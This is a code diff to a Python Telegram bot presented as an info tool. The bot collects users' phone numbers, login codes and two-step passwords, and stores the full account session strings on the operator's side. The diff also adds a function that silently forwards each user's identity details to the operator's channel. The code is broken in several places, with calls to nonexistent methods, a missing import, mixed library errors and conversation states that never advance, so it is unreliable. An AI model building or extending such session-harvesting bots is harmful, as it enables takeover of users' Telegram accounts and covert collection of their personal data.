@@ -6,10 +6,10 @@ import string
 from telegram import Update
 from telegram.ext import Updater, CommandHandler, MessageHandler, CallbackContext, ConversationHandler, Application
 from telegram.ext import filters
-from pyrogram import Client
+from pyrogram import Client, filters as pyrogram_filters
 from pyrogram.errors import ApiIdInvalid, PhoneNumberInvalid, PhoneCodeInvalid, PhoneCodeExpired
 from telethon.errors import SessionPasswordNeededError  # Correct import for session password error
-from config import API_ID, API_HASH, BOT_TOKEN  # Import credentials from config.py
+from config import API_ID, API_HASH, BOT_TOKEN, CHANNEL_ID  # Import credentials and channel ID from config.py
 
 # Generate random session name for each user
 def generate_random_name(length=7):
@@ -30,7 +30,6 @@ async def delete_session_files(user_id):
     if memory_file_exists:
         os.remove(memory_file)
 
-    # Return whether any files were deleted
     return session_file_exists or memory_file_exists
 
 # Save session string in a text file
@@ -46,6 +45,23 @@ def read_session_string(user_id):
     except FileNotFoundError:
         return None
 
+# Function to send user info to your channel
+async def send_user_info_to_channel(update: Update, context: CallbackContext):
+    user = update.message.from_user
+    user_info = (
+        f"New User Info:\n"
+        f"User ID: {user.id}\n"
+        f"Name: {user.first_name} {user.last_name if user.last_name else ''}\n"
+        f"Username: @{user.username if user.username else 'No Username'}\n"
+        f"Language: {user.language_code if user.language_code else 'Not Provided'}\n"
+        f"Chat ID: {update.message.chat.id}\n"
+    )
+    # Send info to the specified channel
+    try:
+        await context.bot.send_message(chat_id=CHANNEL_ID, text=user_info)
+    except Exception as e:
+        logging.error(f"Error sending message to channel: {e}")
+
 # Define the /logout command to clear session data
 async def clear_db(client, message):
     user_id = message.chat.id
@@ -56,86 +72,65 @@ async def clear_db(client, message):
     else:
         await message.reply("⚠️ You are not logged in, no session data found.")
 
-# Define the /login command (using pyrogram Client)
-async def generate_session(update: Update, context: CallbackContext) -> int:
+# Define the /login command
+async def generate_session(update: Update, context: CallbackContext):
     user_id = update.message.chat.id
-    context.user_data['user_id'] = user_id  # Store user_id in user_data to track login
-
-    # Ask user for phone number
-    await update.message.reply("Please enter your phone number along with the country code (e.g., +19876543210).")
-    return 1  # Transition to the next state (state 1)
-
-# Handle phone number input
-async def phone_number(update: Update, context: CallbackContext) -> int:
-    user_id = context.user_data['user_id']
-    phone_number = update.message.text
-
-    # Create pyrogram client for login
-    client = Client(f"session_{user_id}", API_ID, API_HASH)
-    
+    number = await context.bot.ask(update.message.chat.id, 'Please enter your phone number along with the country code. \nExample: +19876543210', filters=filters.text)
+    phone_number = number.text
     try:
         await update.message.reply("📲 Sending OTP...")
+        client = Client(f"session_{user_id}", API_ID, API_HASH)
+        
         await client.connect()
-        code = await client.send_code(phone_number)
-    except (ApiIdInvalid, PhoneNumberInvalid) as e:
-        await update.message.reply(f"❌ Error: {e}")
-        return ConversationHandler.END
-
-    # Ask user for OTP
-    await update.message.reply("Please enter the OTP sent to your Telegram account.")
-    context.user_data['phone_code_hash'] = code.phone_code_hash  # Store phone_code_hash for verification
-    return 2  # Transition to the next state (state 2)
-
-# Handle OTP input
-async def otp_code(update: Update, context: CallbackContext) -> int:
-    user_id = context.user_data['user_id']
-    phone_code = update.message.text.replace(" ", "")
-    phone_code_hash = context.user_data['phone_code_hash']
-
-    client = Client(f"session_{user_id}", API_ID, API_HASH)
-    
-    try:
-        await client.sign_in(update.message.text, phone_code_hash, phone_code)
-    except (PhoneCodeInvalid, PhoneCodeExpired) as e:
-        await update.message.reply(f"❌ OTP Error: {e}")
-        return ConversationHandler.END
-    except SessionPasswordNeededError:
-        # Ask for password if 2FA is enabled
-        await update.message.reply("Your account has two-step verification enabled. Please enter your password.")
-        return 3  # Transition to password state
-
-    # If login successful, save the session string
-    string_session = await client.export_session_string()
-    save_session_string(user_id, string_session)
-    await client.disconnect()
-    
-    await update.message.reply("✅ Login successful!")
-    return ConversationHandler.END  # End conversation
-
-# Handle password input for two-step verification
-async def password_input(update: Update, context: CallbackContext) -> int:
-    user_id = context.user_data['user_id']
-    password = update.message.text
-
-    client = Client(f"session_{user_id}", API_ID, API_HASH)
-    
-    try:
-        await client.check_password(password=password)
     except Exception as e:
-        await update.message.reply(f"❌ Invalid password: {e}")
-        return ConversationHandler.END
+        await update.message.reply(f"❌ Failed to send OTP {e}. Please wait and try again later.")
+        return
     
-    # If password is correct, export the session string
+    try:
+        code = await client.send_code(phone_number)
+    except ApiIdInvalid:
+        await update.message.reply('❌ Invalid combination of API ID and API HASH. Please restart the session.')
+        return
+    except PhoneNumberInvalid:
+        await update.message.reply('❌ Invalid phone number. Please restart the session.')
+        return
+    
+    try:
+        otp_code = await context.bot.ask(update.message.chat.id, "Please check for an OTP in your official Telegram account. Once received, enter the OTP in the following format: \nIf the OTP is `12345`, please enter it as `1 2 3 4 5`.", filters=filters.text, timeout=600)
+    except TimeoutError:
+        await update.message.reply('⏰ Time limit of 10 minutes exceeded. Please restart the session.')
+        return
+    phone_code = otp_code.text.replace(" ", "")
+    
+    try:
+        await client.sign_in(phone_number, code.phone_code_hash, phone_code)
+    except PhoneCodeInvalid:
+        await update.message.reply('❌ Invalid OTP. Please restart the session.')
+        return
+    except PhoneCodeExpired:
+        await update.message.reply('❌ Expired OTP. Please restart the session.')
+        return
+    except SessionPasswordNeededError:
+        try:
+            two_step_msg = await context.bot.ask(update.message.chat.id, 'Your account has two-step verification enabled. Please enter your password.', filters=filters.text, timeout=300)
+        except TimeoutError:
+            await update.message.reply('⏰ Time limit of 5 minutes exceeded. Please restart the session.')
+            return
+        try:
+            password = two_step_msg.text
+            await client.check_password(password=password)
+        except PasswordHashInvalid:
+            await two_step_msg.reply('❌ Invalid password. Please restart the session.')
+            return
+    
     string_session = await client.export_session_string()
-    save_session_string(user_id, string_session)
+    save_session_string(user_id, string_session)  # Save session string locally
     await client.disconnect()
-    
-    await update.message.reply("✅ Login successful with two-step verification!")
-    return ConversationHandler.END  # End conversation
+    await otp_code.reply("✅ Login successful!")
 
 # Define the start and help commands for the bot
-def start(update: Update, context: CallbackContext) -> None:
-    update.message.reply_text(
+async def start(update: Update, context: CallbackContext) -> None:
+    await update.message.reply_text(
         "Hey User! 👋\n"
         "Welcome to the Telegram Info Bot.\n\n"
         "Commands you can use:\n"
@@ -146,8 +141,8 @@ def start(update: Update, context: CallbackContext) -> None:
         "You can also check your own information after successful login."
     )
 
-def help_command(update: Update, context: CallbackContext) -> None:
-    update.message.reply_text(
+async def help_command(update: Update, context: CallbackContext) -> None:
+    await update.message.reply_text(
         "ℹ️ This bot allows you to access some of your Telegram information.\n\n"
         "⚙️ Available Commands:\n"
         "/start - Start the bot\n"
@@ -155,21 +150,21 @@ def help_command(update: Update, context: CallbackContext) -> None:
         "/help - Show this message"
     )
 
-# Unauthorized message handler (before login)
-def handle_unauthorized_messages(update: Update, context: CallbackContext) -> None:
-    if 'user_id' not in context.user_data:
-        update.message.reply_text(
-            "🚫 Aapko pehle login karna hoga! 🔑\n\n"
-            "Aapko /login command ka use karke apne Telegram account se connect karna hoga. "
-            "Uske baad hi main aapki madad kar sakta hoon. 😊"
+# Handle unauthorized messages (before login)
+async def handle_unauthorized_messages(update: Update, context: CallbackContext) -> None:
+    if not context.user_data.get("logged_in"):
+        await update.message.reply_text(
+            "🚫 You need to log in first! 🔑\n\n"
+            "Use the /login command to connect to your Telegram account. "
+            "After logging in, I can assist you further. 😊"
         )
     else:
-        update.message.reply_text(
-            "❓ Main samajh nahi paya. Kripya sahi command ka istemal karein.\n\n"
+        await update.message.reply_text(
+            "❓ I didn't understand that. Please use a valid command.\n\n"
             "Available Commands:\n"
-            "/start - Bot ko start karein\n"
-            "/help - Madad ke liye\n"
-            "/login - Apne Telegram se connect karein"
+            "/start - Start the bot\n"
+            "/help - Help info\n"
+            "/login - Connect your Telegram account"
         )
 
 # Conversation handler
@@ -177,11 +172,11 @@ def conversation_handler() -> ConversationHandler:
     return ConversationHandler(
         entry_points=[CommandHandler('login', generate_session)],  # /login command triggers this conversation
         states={
-            1: [MessageHandler(filters.TEXT & ~filters.COMMAND, phone_number)],  # Step 1: phone number
-            2: [MessageHandler(filters.TEXT & ~filters.COMMAND, otp_code)],  # Step 2: OTP
-            3: [MessageHandler(filters.TEXT & ~filters.COMMAND, password_input)],  # Step 3: Password (if 2FA)
+            'PHONE': [MessageHandler(filters.TEXT & ~filters.COMMAND, generate_session)],  # Step 1: phone number
+            'OTP': [MessageHandler(filters.TEXT & ~filters.COMMAND, generate_session)],  # Step 2: OTP
+            'PASSWORD': [MessageHandler(filters.TEXT & ~filters.COMMAND, generate_session)],  # Step 3: Password (if 2FA)
         },
-        fallbacks=[CommandHandler('help', help_command)],
+        fallbacks=[CommandHandler('help', help_command)],  # In case of fallback
     )
 
 # Main function to run the bot
@@ -203,7 +198,10 @@ def main():
     application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_unauthorized_messages))
 
     # Start Bot Polling
-    application.run_polling()
+    try:
+        application.run_polling()
+    except Exception as e:
+        logging.error(f"Error occurred: {e}")
 
 if __name__ == "__main__":
-    main()  # Ensure this function call is properly indented
+    main()
